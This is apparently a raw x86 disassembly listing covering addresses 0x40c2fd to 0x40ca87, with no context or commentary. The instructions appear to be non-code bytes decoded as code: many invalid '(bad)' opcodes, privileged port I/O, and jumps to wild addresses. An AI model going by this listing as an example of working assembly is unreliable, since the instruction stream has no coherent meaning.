  40c2fd:	pop    ecx
  40c2fe:	aas    
  40c2ff:	add    bh,BYTE PTR [edx+ecx*4+0x9]
  40c303:	mov    esi,ebx
  40c305:	or     DWORD PTR [esi+0x66c82ae],ecx
  40c30b:	push   ebp
  40c30c:	(bad)  
  40c30d:	in     al,0xdb
  40c30f:	pushf  
  40c310:	sub    al,BYTE PTR [edi+0x2d]
  40c313:	test   BYTE PTR [eax],dl
  40c315:	push   cs
  40c316:	and    DWORD PTR [edi-0x7be2dac7],ebp
  40c31c:	push   eax
  40c31d:	push   0xfffffff0
  40c31f:	imul   eax,ebp,0xfffffffc
  40c322:	push   ebx
  40c323:	xor    DWORD PTR [edi+0x143e1b99],eax
  40c329:	retf   
  40c32a:	cmp    al,0x10
  40c32c:	inc    eax
  40c32d:	ror    BYTE PTR [eax-0x1f],1
  40c330:	pop    edx
  40c331:	js     0x40c2cc
  40c333:	mov    cl,0xc4
  40c335:	dec    eax
  40c336:	es leave 
  40c338:	jg     0x40c2eb
  40c33a:	mov    esp,0x55f8cd30
  40c33f:	and    eax,eax
  40c341:	dec    eax
  40c342:	out    dx,eax
  40c343:	jle    0x40c39f
  40c345:	push   eax
  40c346:	xor    eax,DWORD PTR ss:[eax]
  40c349:	cdq    
  40c34a:	(bad)  
  40c34b:	imul   edi,DWORD PTR [esi],0x51
  40c34e:	pusha  
  40c34f:	es jmp 0x40c3b9
  40c352:	push   0xffffffb8
  40c354:	cmp    eax,0x123e3eb1
  40c359:	push   es
  40c35a:	xor    al,ah
  40c35c:	push   ecx
  40c35d:	lahf   
  40c35e:	test   DWORD PTR [ebx-0x75],0xb0570158
  40c365:	test   BYTE PTR [edi-0x44],dh
  40c368:	(bad)  
  40c36a:	loop   0x40c342
  40c36c:	inc    ebx
  40c36d:	shr    DWORD PTR [edx],cl
  40c36f:	sbb    DWORD PTR [edx+0x1784e397],edx
  40c375:	adc    dh,BYTE PTR [ebx+0x71]
  40c378:	std    
  40c379:	fmul   st(4),st
  40c37b:	cld    
  40c37c:	icebp  
  40c37d:	rol    BYTE PTR [ebx],0xb4
  40c380:	mov    ds:0xe615d482,al
  40c385:	push   ss
  40c386:	(bad)  
  40c387:	mov    ebx,0xc6f95c5f
  40c38c:	pop    ss
  40c38d:	ficom  DWORD PTR ss:[edi+0x3]
  40c391:	and    DWORD PTR [eax+edx*1+0x993e7d1],esp
  40c398:	arpl   WORD PTR ds:0x79a3e1e8,dx
  40c39e:	dec    esp
  40c39f:	jb     0x40c3d4
  40c3a1:	scas   eax,DWORD PTR es:[edi]
  40c3a2:	sahf   
  40c3a3:	lock sbb DWORD PTR [ebx],ebp
  40c3a6:	lahf   
  40c3a7:	cmp    DWORD PTR ds:0x1534052d,edx
  40c3ad:	push   es
  40c3ae:	shl    DWORD PTR [ebp+eax*4-0x4fb3a727],0x81
  40c3b6:	dec    ebp
  40c3b7:	push   cs
  40c3b8:	mov    dh,0x62
  40c3ba:	push   ecx
  40c3bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3bc:	inc    eax
  40c3bd:	xor    BYTE PTR [ebx+ebx*2+0x1e],bh
  40c3c1:	add    eax,0x184df6d6
  40c3c6:	mov    DWORD PTR [ebp+0x5a7c0a29],eax
  40c3cc:	jmp    0x40c3cf
  40c3ce:	mov    bl,0xe7
  40c3d0:	dec    eax
  40c3d1:	dec    ecx
  40c3d2:	test   eax,0x3b2a2606
  40c3d7:	rcr    cl,1
  40c3d9:	inc    ebx
  40c3da:	lea    esp,[esi+esi*1+0x40]
  40c3de:	xchg   ebx,eax
  40c3df:	cmp    DWORD PTR [ebp-0x680c52d0],ebp
  40c3e5:	inc    esp
  40c3e6:	push   ds
  40c3e7:	aam    0xf5
  40c3e9:	mov    dl,0x8d
  40c3eb:	les    eax,FWORD PTR [ecx+edi*8]
  40c3ee:	arpl   WORD PTR [ebx-0x572321bd],si
  40c3f4:	lods   al,BYTE PTR ss:[esi]
  40c3f6:	inc    edi
  40c3f7:	pop    ecx
  40c3f8:	jbe    0x40c424
  40c3fa:	or     ah,BYTE PTR [esi-0x3b656486]
  40c400:	sub    esp,DWORD PTR [ebx]
  40c402:	jnp    0x40c3a7
  40c404:	data16 xor dh,BYTE PTR [ebx]
  40c407:	in     al,dx
  40c408:	(bad)  
  40c409:	and    al,0x0
  40c40b:	imul   ecx,DWORD PTR [edx+eax*4+0x19],0x91e3aa20
  40c413:	jb     0x40c485
  40c415:	push   ebx
  40c416:	inc    esi
  40c417:	addr16 push edx
  40c419:	ins    DWORD PTR es:[edi],dx
  40c41a:	push   esi
  40c41b:	mov    es,ecx
  40c41d:	pop    edi
  40c41e:	sbb    al,0xd7
  40c420:	sbb    BYTE PTR ds:0x55d3f7f5,0x71
  40c427:	repnz adc dh,cl
  40c42a:	or     al,0xfd
  40c42c:	xlat   BYTE PTR ds:[ebx]
  40c42d:	jmp    0x8baf5f51
  40c432:	push   esp
  40c433:	dec    ebx
  40c434:	push   ds
  40c435:	shl    DWORD PTR [esi-0x1b],1
  40c438:	add    edi,edx
  40c43a:	dec    eax
  40c43b:	jge    0x40c3da
  40c43d:	out    0xd8,al
  40c43f:	pushf  
  40c440:	ins    DWORD PTR es:[edi],dx
  40c441:	dec    ebp
  40c442:	je     0x40c471
  40c444:	jbe    0x40c4c3
  40c446:	test   al,0xed
  40c448:	cmp    al,0x45
  40c44a:	in     eax,0xfc
  40c44c:	push   ecx
  40c44d:	inc    edx
  40c44e:	xchg   DWORD PTR [eax+eiz*8],eax
  40c451:	js     0x40c3d5
  40c453:	shl    DWORD PTR ds:0xe77eb468,0x50
  40c45a:	daa    
  40c45b:	and    eax,0x7fb46e04
  40c460:	xchg   BYTE PTR [eax+0x3bc96724],dh
  40c466:	push   ebx
  40c467:	xor    al,BYTE PTR [ebx+0x2c5cc287]
  40c46d:	ds out 0xd,al
  40c470:	add    DWORD PTR [ebx],edi
  40c472:	sbb    BYTE PTR [esi+0x1298afd3],dh
  40c478:	xchg   ebx,eax
  40c479:	mov    BYTE PTR [ebp-0x5c],ch
  40c47c:	sub    BYTE PTR [edx+edx*4],dh
  40c47f:	(bad)  
  40c480:	mov    ecx,0xc6f31e66
  40c485:	fisubr DWORD PTR [ecx-0x1e8e08cb]
  40c48b:	jle    0x40c4f4
  40c48d:	jg     0x40c451
  40c48f:	xchg   esp,eax
  40c490:	cmp    eax,0xc6555cd3
  40c495:	jmp    0x40c4ff
  40c497:	push   eax
  40c498:	(bad)  [ecx]
  40c49a:	inc    ecx
  40c49b:	test   BYTE PTR [ecx],dl
  40c49d:	ins    DWORD PTR es:[edi],dx
  40c49e:	sub    BYTE PTR [ebx-0x234a392b],bl
  40c4a4:	test   bh,al
  40c4a6:	in     eax,0xaa
  40c4a8:	clc    
  40c4a9:	dec    edx
  40c4aa:	dec    ecx
  40c4ab:	lods   al,BYTE PTR ds:[esi]
  40c4ac:	inc    ecx
  40c4ad:	popf   
  40c4ae:	xor    esp,esp
  40c4b0:	cmp    al,0x53
  40c4b2:	xor    ax,0x53ba
  40c4b6:	dec    esi
  40c4b7:	cmc    
  40c4b8:	mov    ch,0xaa
  40c4ba:	push   ebx
  40c4bb:	jne    0x40c483
  40c4bd:	jo     0x40c480
  40c4bf:	adc    eax,0xc1d45cce
  40c4c4:	sbb    DWORD PTR [ebp-0x62],edx
  40c4c7:	jecxz  0x40c4c2
  40c4c9:	add    eax,0x83e38b6a
  40c4ce:	jns    0x40c49d
  40c4d0:	in     eax,0x97
  40c4d2:	aam    0x98
  40c4d4:	loope  0x40c4d8
  40c4d6:	add    BYTE PTR [edx+edi*2],0xa3
  40c4da:	mov    ah,0x8f
  40c4dc:	sbb    edi,DWORD PTR [eax+0x3798270c]
  40c4e2:	mov    cl,0x2f
  40c4e4:	xchg   ebp,eax
  40c4e5:	or     DWORD PTR [ebp+eax*8-0x77e89e04],0x38
  40c4ed:	mov    edx,0xdd70a700
  40c4f2:	test   al,0x3b
  40c4f4:	fs call 0x33716818
  40c4fa:	repnz das 
  40c4fc:	add    esp,ecx
  40c4fe:	xchg   ebp,eax
  40c4ff:	xor    BYTE PTR [edi+0x2e],0x45
  40c503:	or     al,BYTE PTR [ecx-0x2ee11ef9]
  40c509:	dec    BYTE PTR [esp+edi*8]
  40c50c:	lods   eax,DWORD PTR ds:[esi]
  40c50d:	sub    BYTE PTR [ecx+0x61816052],dl
  40c513:	js     0x40c4b7
  40c515:	add    al,0x89
  40c517:	call   0x9a82:0x50269cde
  40c51e:	imul   edi,DWORD PTR [edx+0x6e04667],0x69
  40c525:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c526:	or     esp,edi
  40c528:	pop    eax
  40c529:	in     eax,0xa4
  40c52b:	sahf   
  40c52c:	cmc    
  40c52d:	xchg   BYTE PTR [edx-0x1208f82f],cl
  40c533:	and    eax,0xc578b84
  40c538:	stos   DWORD PTR es:[edi],eax
  40c539:	sub    dh,BYTE PTR [esi+ebx*8+0x68ab39fd]
  40c540:	ja     0x40c55d
  40c542:	repnz cld 
  40c544:	mov    al,0x80
  40c546:	sbb    esi,edi
  40c548:	push   eax
  40c549:	cmp    DWORD PTR [edi],esp
  40c54b:	or     al,0x0
  40c54d:	sbb    al,0xfc
  40c54f:	sbb    ah,bl
  40c551:	pop    ss
  40c552:	or     eax,0xace92e90
  40c557:	retf   
  40c558:	mov    WORD PTR [edi+0x7f],gs
  40c55b:	sub    BYTE PTR [eax-0x2ea71633],al
  40c561:	test   al,0xed
  40c563:	daa    
  40c564:	jg     0x40c576
  40c566:	cmp    DWORD PTR [edx+0x6d04c6e2],edi
  40c56c:	xchg   esi,eax
  40c56d:	xor    eax,0xe8912dd1
  40c572:	(bad)  
  40c573:	jmp    0x8bed47bf
  40c578:	int    0x40
  40c57a:	mov    ch,0x8c
  40c57c:	lock ret 0xa11a
  40c580:	sub    al,0x78
  40c582:	adc    ch,BYTE PTR [ebx-0x7]
  40c585:	pop    ecx
  40c586:	mov    edi,0xbcac4b89
  40c58b:	es scas eax,DWORD PTR es:[edi]
  40c58d:	or     eax,0x239bc024
  40c592:	jge    0x40c584
  40c594:	jns    0x40c522
  40c596:	cmp    esp,edx
  40c598:	iret   
  40c599:	out    0x4f,eax
  40c59b:	xor    BYTE PTR [edi+0x0],bl
  40c59e:	xor    ebx,DWORD PTR [eax+0x0]
  40c5a1:	cmp    BYTE PTR [esi-0x4773879a],ch
  40c5a7:	les    eax,FWORD PTR [esi]
  40c5a9:	mov    eax,ds:0xa419e9f0
  40c5ae:	cld    
  40c5af:	loope  0x40c5ed
  40c5b1:	jg     0x40c5fc
  40c5b3:	(bad)  
  40c5b4:	gs mov edx,0x224d59e3
  40c5ba:	les    edi,FWORD PTR [ecx]
  40c5bc:	xor    bl,ch
  40c5be:	pushf  
  40c5bf:	in     al,dx
  40c5c0:	test   al,0x2
  40c5c2:	pop    cx
  40c5c4:	rcr    BYTE PTR [ecx+0x526f3f99],cl
  40c5ca:	scas   al,BYTE PTR es:[edi]
  40c5cb:	dec    esi
  40c5cc:	pop    ds
  40c5cd:	pop    esp
  40c5cf:	daa    
  40c5d0:	sti    
  40c5d1:	daa    
  40c5d2:	sar    eax,1
  40c5d4:	fisub  WORD PTR [ebp-0x65]
  40c5d7:	out    0xa1,al
  40c5d9:	mov    DWORD PTR [edi-0x45081519],eax
  40c5df:	inc    ebp
  40c5e0:	jbe    0x40c623
  40c5e2:	int    0x79
  40c5e4:	pushf  
  40c5e5:	inc    edx
  40c5e6:	sub    eax,DWORD PTR ss:[ebx+0x299d645f]
  40c5ed:	push   cs
  40c5ee:	push   eax
  40c5ef:	je     0x40c64e
  40c5f1:	in     al,dx
  40c5f2:	sub    dh,cl
  40c5f4:	cld    
  40c5f5:	(bad)  
  40c5f7:	inc    esi
  40c5f8:	rcl    DWORD PTR [esi+0x385b3af2],cl
  40c5fe:	adc    eax,0x5462fd38
  40c603:	sbb    BYTE PTR [edi-0x2708747e],ch
  40c609:	mov    ecx,0xa9f4134b
  40c60e:	pop    edx
  40c60f:	sbb    BYTE PTR [ebx+0x219229c],ah
  40c615:	jg     0x40c633
  40c617:	adc    ah,BYTE PTR [eax-0x39]
  40c61a:	dec    edi
  40c61b:	adc    eax,0x8cdf4ca4
  40c620:	add    bl,bh
  40c622:	inc    eax
  40c623:	and    esi,DWORD PTR [esi+edi*1]
  40c626:	mov    al,ds:0xd7f8f16a
  40c62b:	lock push es
  40c62d:	imul   edx,ecx,0x1b
  40c630:	aas    
  40c631:	into   
  40c632:	cld    
  40c633:	push   cs
  40c634:	push   ss
  40c635:	mov    dl,0x83
  40c637:	rcr    DWORD PTR [ebp-0x11432208],cl
  40c63d:	aam    0xc7
  40c63f:	mov    esp,0xa34d44b5
  40c644:	xlat   BYTE PTR ds:[ebx]
  40c645:	jge    0x40c5d8
  40c647:	or     ecx,DWORD PTR [ebp-0x34d5499e]
  40c64d:	fcomp  DWORD PTR [esi+0x44d86fab]
  40c653:	ret    
  40c654:	outs   dx,BYTE PTR ds:[esi]
  40c655:	inc    edi
  40c656:	fcomp  st(6)
  40c658:	jl     0x40c6cf
  40c65a:	mov    bl,BYTE PTR ds:0x7e2821fb
  40c660:	or     eax,0xdec37cf
  40c665:	(bad)  
  40c666:	ds scas al,BYTE PTR es:[edi]
  40c668:	sub    DWORD PTR ds:0xc98d6611,ebx
  40c66e:	dec    ebx
  40c66f:	ins    DWORD PTR es:[edi],dx
  40c670:	jp     0x40c656
  40c672:	mov    bh,0xe7
  40c674:	adc    cl,BYTE PTR [ebp-0x10e9ca9c]
  40c67a:	ins    DWORD PTR es:[edi],dx
  40c67b:	retf   
  40c67c:	and    al,0x54
  40c67e:	sahf   
  40c67f:	mov    al,0x6f
  40c681:	sti    
  40c682:	aad    0x48
  40c684:	push   cs
  40c685:	mov    ds:0x5b20350b,eax
  40c68a:	push   ecx
  40c68b:	xchg   esi,eax
  40c68c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c68d:	imul   eax,DWORD PTR [esi-0x6c1ddfcf],0x37
  40c694:	xor    dl,al
  40c696:	out    dx,eax
  40c697:	pop    ebx
  40c698:	js     0x40c6ec
  40c69a:	shl    ch,0x9e
  40c69d:	mov    esi,DWORD PTR [edi+0x6b]
  40c6a0:	sub    ecx,DWORD PTR [ebp+0x2d9add5f]
  40c6a6:	jno    0x40c6c8
  40c6a8:	call   0x15c16752
  40c6ad:	mov    ebx,esp
  40c6af:	pop    esi
  40c6b0:	xor    dh,dl
  40c6b2:	jl     0x40c6ac
  40c6b4:	test   eax,0x3b61cd53
  40c6b9:	sti    
  40c6ba:	push   ebx
  40c6bb:	or     eax,0x5cd6c95f
  40c6c0:	jnp    0x40c6f0
  40c6c2:	test   al,0x6c
  40c6c4:	ret    0xfd7c
  40c6c7:	in     eax,0x1a
  40c6c9:	jecxz  0x40c6ec
  40c6cb:	std    
  40c6cc:	mov    dl,0xe5
  40c6ce:	or     BYTE PTR [eax+edi*1],al
  40c6d1:	xchg   ebp,eax
  40c6d2:	pop    es
  40c6d3:	(bad)  
  40c6d4:	jmp    0x93755d8b
  40c6d9:	mov    edx,0x76f17af9
  40c6de:	(bad)  
  40c6df:	in     eax,0xc2
  40c6e1:	xrelease xchg BYTE PTR [edi-0xe],dl
  40c6e5:	and    al,0x9e
  40c6e7:	sub    DWORD PTR [ecx],edi
  40c6e9:	sti    
  40c6ea:	add    ebp,DWORD PTR [edi]
  40c6ec:	icebp  
  40c6ed:	push   eax
  40c6ee:	out    dx,al
  40c6ef:	fadd   QWORD PTR [ebp+0x41]
  40c6f2:	fstp   DWORD PTR [ebx-0x8]
  40c6f5:	xor    eax,0x433cdde9
  40c6fa:	bswap  ebp
  40c6fc:	or     eax,0xb5bf9acf
  40c701:	pop    eax
  40c702:	ror    dl,1
  40c704:	loop   0x40c70f
  40c706:	dec    esp
  40c707:	jg     0x40c694
  40c709:	std    
  40c70a:	out    dx,eax
  40c70b:	(bad)  
  40c70d:	xor    eax,0x33f05760
  40c712:	test   al,0xf9
  40c714:	(bad)  
  40c715:	jae    0x40c74d
  40c717:	movsx  ebx,WORD PTR [ebx]
  40c71a:	sub    ah,BYTE PTR [esi-0x41afeefc]
  40c720:	add    DWORD PTR [edx],0xffffffce
  40c723:	loope  0x40c747
  40c725:	in     al,dx
  40c726:	xor    eax,0x3a5873f9
  40c72b:	and    ecx,0x4b
  40c72e:	jecxz  0x40c6f8
  40c730:	sahf   
  40c731:	loopne 0x40c727
  40c733:	pop    ebx
  40c734:	jmp    0x998f5df1
  40c739:	in     eax,dx
  40c73a:	push   esp
  40c73b:	repnz adc esp,DWORD PTR [edi]
  40c73e:	cmp    ch,BYTE PTR ds:0xa8a872ae
  40c744:	jno    0x40c74e
  40c746:	inc    edx
  40c747:	pop    ebp
  40c748:	xchg   ebp,eax
  40c749:	mov    dh,0x40
  40c74b:	gs (bad) 
  40c74d:	icebp  
  40c74e:	pop    ecx
  40c74f:	dec    esp
  40c750:	cmc    
  40c751:	and    al,0xef
  40c753:	dec    ecx
  40c754:	push   0x248c0a76
  40c759:	stos   BYTE PTR es:[edi],al
  40c75a:	aam    0x23
  40c75c:	adc    dh,BYTE PTR [esp+edi*2]
  40c75f:	add    bl,BYTE PTR [edx+0x65bdd436]
  40c765:	inc    edi
  40c766:	stos   BYTE PTR es:[edi],al
  40c767:	cmova  esp,DWORD PTR [eax+0x3b]
  40c76b:	js     0x40c746
  40c76d:	aas    
  40c76e:	into   
  40c76f:	sub    dh,al
  40c771:	jle    0x40c7f0
  40c773:	(bad)  
  40c774:	call   FWORD PTR [ebp-0xf]
  40c777:	inc    esi
  40c778:	ja     0x40c7bc
  40c77a:	push   0xffffff81
  40c77c:	test   eax,0x126761e0
  40c781:	xchg   ebp,eax
  40c782:	sub    eax,0xf389c15e
  40c787:	xchg   esi,eax
  40c788:	jp     0x40c7ea
  40c78a:	mov    edx,0xde042d25
  40c78f:	sahf   
  40c790:	cmp    DWORD PTR [ecx+0x15a75eb7],esi
  40c796:	mov    bl,0x21
  40c798:	bound  esp,QWORD PTR [ecx+ecx*8]
  40c79b:	mov    ecx,0x988955a8
  40c7a0:	push   cs
  40c7a1:	ds in  eax,dx
  40c7a3:	jne    0x40c823
  40c7a5:	and    dh,BYTE PTR [ebx-0x102ec856]
  40c7ab:	dec    edx
  40c7ac:	and    eax,ebx
  40c7ae:	shr    ebx,1
  40c7b0:	sbb    eax,0xcfeb2845
  40c7b5:	fst    DWORD PTR [edx]
  40c7b7:	dec    eax
  40c7b8:	in     eax,0x38
  40c7ba:	into   
  40c7bb:	lods   eax,DWORD PTR ds:[esi]
  40c7bc:	shl    DWORD PTR [ecx+0x24d8e3f5],0xfe
  40c7c3:	lods   al,BYTE PTR ds:[esi]
  40c7c4:	ret    0x17aa
  40c7c7:	idiv   ah
  40c7c9:	jmp    0x96ed:0x11380801
  40c7d0:	xor    eax,0xbea94a1d
  40c7d5:	pop    esi
  40c7d6:	jl     0x40c84e
  40c7d8:	mov    ebx,0x16d622ee
  40c7dd:	sbb    BYTE PTR [ecx+0x1b],bh
  40c7e0:	sbb    eax,edi
  40c7e2:	(bad)  
  40c7e3:	mov    ebx,0xe45e7cb5
  40c7e8:	inc    edx
  40c7e9:	sub    bl,cl
  40c7eb:	mov    ds:0x7da47612,eax
  40c7f0:	les    ebx,FWORD PTR [esi]
  40c7f2:	mov    bl,0xdd
  40c7f4:	addr16 ss dec ebx
  40c7f7:	xchg   edi,eax
  40c7f8:	mov    edx,0x1279f4ba
  40c7fd:	sub    BYTE PTR [edx-0x5f],0x7
  40c801:	inc    edx
  40c802:	mov    ah,0x5f
  40c804:	sub    BYTE PTR [edx],dh
  40c806:	jg     0x40c846
  40c808:	xor    DWORD PTR [edi],0x6d
  40c80b:	sub    al,0xba
  40c80d:	mov    ebx,0x5d4dc223
  40c812:	sub    al,0xc9
  40c814:	imul   ebx,DWORD PTR [edi-0x17800ccc],0xfffffff0
  40c81b:	mov    di,0xaa7c
  40c81f:	popa   
  40c820:	and    eax,0xa558329a
  40c825:	lock mov ebx,0xfe2bbb34
  40c82b:	icebp  
  40c82c:	mov    dh,0x50
  40c82e:	bound  esp,QWORD PTR [ebx+0x7a]
  40c831:	pop    ecx
  40c832:	lock cmp BYTE PTR [ebx-0x249b93c7],ch
  40c839:	rcl    DWORD PTR [ebx-0x54],cl
  40c83c:	imul   eax,DWORD PTR [ebx+0xb190946],0xffffffb9
  40c843:	add    ebx,0xfffffff0
  40c846:	inc    esp
  40c847:	mov    esi,DWORD PTR [ecx+0xe]
  40c84a:	mov    ecx,0x7ff12379
  40c84f:	(bad)  
  40c850:	ins    DWORD PTR es:[edi],dx
  40c851:	pop    DWORD PTR ds:0xffb5d8ac
  40c857:	aad    0xc2
  40c859:	arpl   WORD PTR [ecx+0x2f41328],cx
  40c85f:	arpl   WORD PTR [ebp+0x6138a16f],bx
  40c865:	mov    ah,0x13
  40c867:	mov    al,0xfe
  40c869:	add    BYTE PTR [edi],bh
  40c86b:	xor    DWORD PTR [esi-0x6d9e6f82],edx
  40c871:	dec    DWORD PTR [ecx+0x68bc963a]
  40c877:	nop
  40c878:	dec    eax
  40c879:	and    eax,0x2cc7c0af
  40c87e:	cld    
  40c87f:	sbb    DWORD PTR [esi+0x48],ebp
  40c882:	inc    edx
  40c883:	inc    eax
  40c884:	jge    0x40c873
  40c886:	lods   al,BYTE PTR ds:[esi]
  40c887:	gs xor eax,0xa03a0e34
  40c88d:	aas    
  40c88e:	stos   DWORD PTR es:[edi],eax
  40c88f:	fisub  WORD PTR [ebx+0x30]
  40c892:	sbb    eax,0xae5ebd17
  40c897:	cmp    BYTE PTR [ebx+0x29],0xda
  40c89b:	and    dl,BYTE PTR [ebp+0x616743c4]
  40c8a1:	in     eax,0x98
  40c8a3:	aam    0x17
  40c8a5:	ss add eax,0x6243a73e
  40c8ab:	call   0xb75f10d3
  40c8b0:	push   ds
  40c8b1:	lods   al,BYTE PTR ds:[esi]
  40c8b2:	retf   
  40c8b3:	sbb    DWORD PTR [edi],ecx
  40c8b5:	xor    DWORD PTR [ecx-0x3a],ecx
  40c8b8:	das    
  40c8b9:	adc    eax,0x6ddbe14a
  40c8be:	icebp  
  40c8bf:	cmp    BYTE PTR [edx-0x2318ebd9],dl
  40c8c5:	mov    eax,ds:0x8559a804
  40c8ca:	jo     0x40c8a7
  40c8cc:	add    ebx,ecx
  40c8ce:	xor    BYTE PTR [ebx],0x34
  40c8d1:	dec    ebp
  40c8d2:	mov    ebp,0xe956b411
  40c8d7:	dec    ebp
  40c8d8:	aad    0x76
  40c8da:	ins    BYTE PTR es:[edi],dx
  40c8db:	push   esi
  40c8dc:	xor    eax,0xc5670955
  40c8e1:	call   0xe822:0xaf108328
  40c8e8:	fnclex 
  40c8ea:	mov    bh,0xd5
  40c8ec:	retf   0x8398
  40c8ef:	icebp  
  40c8f0:	stc    
  40c8f1:	adc    dl,BYTE PTR [edx-0x54]
  40c8f4:	jne    0x40c89b
  40c8f6:	clc    
  40c8f7:	fmul   QWORD PTR [ebp-0x40fbd07f]
  40c8fd:	lds    ebp,FWORD PTR [esp+eiz*8]
  40c900:	xchg   BYTE PTR [eax-0xb],cl
  40c903:	mov    eax,0x917c6084
  40c908:	push   edx
  40c909:	and    cl,BYTE PTR [edi-0x77]
  40c90c:	loopne 0x40c979
  40c90e:	xchg   ebp,eax
  40c90f:	sti    
  40c910:	out    dx,eax
  40c911:	and    eax,0x98bde0c7
  40c916:	push   es
  40c917:	xor    eax,0x5be998a8
  40c91c:	inc    ecx
  40c91d:	loope  0x40c970
  40c91f:	cdq    
  40c920:	jns    0x40c8f8
  40c922:	lods   eax,DWORD PTR ds:[esi]
  40c923:	pop    edx
  40c924:	jnp    0x40c8be
  40c926:	(bad)  
  40c927:	shl    bl,0x90
  40c92a:	mov    edi,0xb014743a
  40c92f:	sbb    ch,BYTE PTR [esi]
  40c931:	add    al,0x7e
  40c933:	(bad)  
  40c934:	mov    al,0xb6
  40c936:	fwait
  40c937:	lock test DWORD PTR [edi-0x24ddda93],ebp
  40c93e:	out    dx,al
  40c93f:	lea    esi,[ebx+0x43]
  40c942:	stos   DWORD PTR es:[edi],eax
  40c943:	scas   eax,DWORD PTR es:[edi]
  40c944:	fnstsw WORD PTR [esi+0x4c4a2f60]
  40c94a:	shr    DWORD PTR ds:0x5ee3a68b,cl
  40c950:	jne    0x40c97d
  40c952:	push   ebp
  40c953:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c954:	mov    dh,0x4e
  40c956:	clc    
  40c957:	aam    0x93
  40c959:	mov    ecx,ebp
  40c95b:	sub    eax,0x7b144847
  40c960:	cmp    DWORD PTR [esi-0x18],esp
  40c963:	fwait
  40c964:	mov    al,BYTE PTR [esi+0x6]
  40c967:	(bad)  
  40c968:	dec    esp
  40c969:	jmp    0x8a88d1fb
  40c96e:	or     ebx,DWORD PTR [edx+0x4e]
  40c971:	xchg   ebx,eax
  40c972:	or     dh,cl
  40c974:	mov    esi,0x6b1d5c48
  40c979:	inc    esi
  40c97a:	daa    
  40c97b:	xchg   edx,eax
  40c97c:	orps   xmm7,XMMWORD PTR [ecx+0x7e]
  40c980:	and    DWORD PTR [ecx+0x7bb287bf],esi
  40c986:	sub    eax,0xbddaa1cd
  40c98b:	or     ebx,DWORD PTR [ebp+esi*4+0x5e]
  40c98f:	push   ecx
  40c990:	mov    ebx,0x56373826
  40c995:	mov    ebx,0xbfc9a819
  40c99a:	popa   
  40c99b:	sbb    BYTE PTR [eax-0x5c],cl
  40c99e:	(bad)  
  40c99f:	daa    
  40c9a0:	(bad)  
  40c9a1:	ror    BYTE PTR [edi],cl
  40c9a3:	cmp    dl,dl
  40c9a5:	loopne 0x40c992
  40c9a7:	lahf   
  40c9a8:	mov    ah,0x9b
  40c9aa:	pop    ss
  40c9ab:	mov    DWORD PTR [ebp+edx*1-0x77],0xcbda6b37
  40c9b3:	popa   
  40c9b4:	fisttp WORD PTR [edi]
  40c9b6:	mov    dl,0x90
  40c9b8:	jnp    0x40c94d
  40c9ba:	sti    
  40c9bb:	xchg   DWORD PTR [eax+ebp*2],ebp
  40c9be:	xlat   BYTE PTR ds:[ebx]
  40c9bf:	les    ecx,FWORD PTR [edx+0x49]
  40c9c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9c3:	mov    dh,0x7e
  40c9c5:	aas    
  40c9c6:	mov    bh,0x2
  40c9c8:	jne    0x40c9c4
  40c9ca:	(bad)  
  40c9cb:	and    al,al
  40c9cd:	sub    al,0x95
  40c9cf:	or     DWORD PTR [ebp+0x3206c5b],esi
  40c9d5:	idiv   DWORD PTR [ecx-0xf6db454]
  40c9db:	sbb    BYTE PTR [edi+0x127e5563],dh
  40c9e1:	sub    dh,bh
  40c9e3:	xor    eax,0x154f433b
  40c9e8:	stos   BYTE PTR es:[edi],al
  40c9e9:	(bad)  
  40c9ea:	fldenv [ecx-0x67]
  40c9ed:	out    0x85,eax
  40c9ef:	popf   
  40c9f0:	out    dx,eax
  40c9f1:	mov    al,0xbf
  40c9f3:	inc    ebp
  40c9f4:	dec    ebp
  40c9f5:	cmp    ch,BYTE PTR ds:0x408c64d4
  40c9fb:	add    DWORD PTR [edi],edx
  40c9fd:	lods   al,BYTE PTR ds:[esi]
  40c9fe:	mov    bh,0x84
  40ca00:	jno    0x40c98b
  40ca02:	sbb    ebx,DWORD PTR [ecx]
  40ca04:	scas   eax,DWORD PTR es:[edi]
  40ca05:	lahf   
  40ca06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca07:	fldenv [ebx+0x6e2ba219]
  40ca0d:	push   esp
  40ca0e:	sbb    eax,0xd5efbef4
  40ca13:	mov    esp,DWORD PTR [ecx]
  40ca15:	dec    esi
  40ca16:	addr16 or al,0x62
  40ca19:	jnp    0x40ca09
  40ca1b:	ror    DWORD PTR ds:0x7ec2c4a0,1
  40ca21:	out    dx,al
  40ca22:	pushf  
  40ca23:	pop    ss
  40ca24:	pop    ss
  40ca25:	pop    esi
  40ca26:	adc    BYTE PTR [ecx-0x52],ah
  40ca29:	sbb    eax,0x2f827fcf
  40ca2e:	enter  0x17a5,0x82
  40ca32:	(bad)  
  40ca33:	idiv   dh
  40ca35:	std    
  40ca36:	cmc    
  40ca37:	fwait
  40ca38:	dec    ebx
  40ca39:	xlat   BYTE PTR ds:[ebx]
  40ca3a:	push   ecx
  40ca3b:	dec    ebp
  40ca3c:	loop   0x40ca37
  40ca3e:	aam    0xbf
  40ca40:	int    0x4e
  40ca42:	cmp    eax,0xaa3542df
  40ca47:	js     0x40c9e4
  40ca49:	mov    ecx,0xf0a855e6
  40ca4e:	xchg   BYTE PTR [edi+0x46],ch
  40ca51:	mov    esi,0x6e6883fe
  40ca56:	cli    
  40ca57:	lods   eax,DWORD PTR ds:[esi]
  40ca58:	xor    eax,DWORD PTR [ebx+0x31]
  40ca5b:	outs   dx,BYTE PTR ds:[esi]
  40ca5c:	mov    al,ds:0x61a744a2
  40ca61:	lea    eax,ds:0xe14eb3bf
  40ca67:	inc    ebx
  40ca68:	xor    esi,DWORD PTR [edi-0x5f1ff48e]
  40ca6e:	popf   
  40ca6f:	data16 aas 
  40ca71:	lods   al,BYTE PTR ds:[esi]
  40ca72:	xchg   esp,eax
  40ca73:	dec    ebp
  40ca74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca75:	xor    al,BYTE PTR [ebp+0x22ae9320]
  40ca7b:	push   ecx
  40ca7c:	jle    0x40ca6a
  40ca7e:	mov    eax,0x5bf0cfb3
  40ca83:	or     al,0x15
  40ca85:	jns    0x40cab0
  40ca87:	js     0x40cad8
